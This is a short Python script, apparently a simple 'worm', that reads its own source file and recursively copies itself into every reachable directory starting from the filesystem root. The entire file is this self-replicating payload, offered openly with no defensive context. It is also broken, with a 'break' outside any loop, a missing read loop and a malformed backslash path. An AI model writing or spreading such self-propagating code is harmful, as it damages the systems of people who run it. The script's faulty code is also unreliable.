import os
import random

random.seed()

os.chdir('/')

MEMORY_PER_RUN = 4000
WORM_BIN = b""
with open("worm.py", "rb") as infile:
    info = infile.read(MEMORY_PER_RUN)
        
    if info == b"":
        break
    WORM_BIN += info

def traverse(path):
    with os.scandir(path) as scanner:
        try:
            with open(path+"\worm1.py", "wb") as outfile:
                outfile.write(WORM_BIN)
        except PermissionError:
            pass

        if scanner:
            directories = [entry for entry in scanner if entry.is_dir()]

            if directories:
                for entry in directories:
                    try:      
                        traverse(entry.path)
                
                    except PermissionError:
                        continue
    return

traverse(os.getcwd())
